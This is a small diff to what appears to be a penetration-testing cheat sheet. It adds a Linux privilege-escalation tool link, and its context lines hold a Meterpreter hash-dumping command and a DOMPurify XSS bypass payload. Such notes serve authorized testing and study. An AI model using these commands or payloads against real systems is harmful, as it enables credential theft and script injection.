@@ -199,7 +199,9 @@ $ python windows-exploit-suggester.py --database 2019-09-25-mssb.xls --systeminf
 # Get hash windows 
 meterpreter > run post/windows/gather/smart_hashdump
 
-
+# Linux privesc  
+https://github.com/mzet-/linux-exploit-suggester
+  
 #XSS bypass Dompurify  
 <svg></p><style><a id="</style><img src=1 onerror=alert(1)>">  
 SigSev2 payload :  
